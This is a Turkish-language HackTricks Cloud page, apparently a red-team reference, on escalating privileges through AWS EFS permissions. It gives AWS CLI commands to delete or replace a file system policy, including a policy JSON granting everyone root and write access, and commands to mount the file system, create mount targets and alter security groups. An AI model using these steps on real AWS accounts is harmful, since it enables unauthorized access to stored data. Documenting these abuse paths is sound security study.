# AWS - EFS Privilege Escalation

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## EFS

Daha fazla **EFS hakkında bilgi** için:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Bir EFS'yi bağlamak için EFS'nin açığa çıkarıldığı bir alt ağda olmanız ve erişiminizin olması gerektiğini unutmayın (güvenlik grupları). Bu durum gerçekleşiyorsa varsayılan olarak her zaman bağlanabilirsiniz, ancak IAM politikalarıyla korunuyorsa erişim sağlamak için burada belirtilen ek izinlere sahip olmanız gerekir.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Bu izinlerden herhangi birine sahip bir saldırgan, **dosya sistemi politikasını değiştirebilir** ve size erişim sağlayabilir veya sadece onu **silebilir** böylece **varsayılan erişim** verilir.

Politikayı silmek için:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Değiştirmek için:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Bu izinle bir saldırgan **EFS'yi bağlayabilecek**. Eğer EFS'yi bağlayabilen herkese yazma izni verilmediyse, sadece **okuma erişimi** olacaktır.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Ek izinler `elasticfilesystem:ClientRootAccess` ve `elasticfilesystem:ClientWrite` dosya sistemi içine **yazma** ve o dosya sistemine **root olarak erişme** izni verir.

**Potansiyel Etki:** Dosya sisteminde hassas bilgiler bulunarak dolaylı ayrıcalık yükseltme.

### `elasticfilesystem:CreateMountTarget`

Eğer bir saldırgan, EFS'nin **bağlama hedefi olmadığı** bir **alt ağ** içinde ise, bu ayrıcalıkla **kendi alt ağına bir tane oluşturabilir**:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potansiyel Etki:** Dosya sisteminde hassas bilgileri bulma yoluyla dolaylı ayrıcalık yükseltme.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

Bir saldırganın, EFS'nin alt ağında bağlama hedefine sahip olduğunu ancak **hiçbir güvenlik grubunun trafiğe izin vermediğini** bulduğu bir senaryoda, sadece **seçilen güvenlik gruplarını değiştirerek bunu değiştirebilir**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potansiyel Etki:** Dosya sisteminde hassas bilgileri bulma yoluyla dolaylı ayrıcalık yükseltme.

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
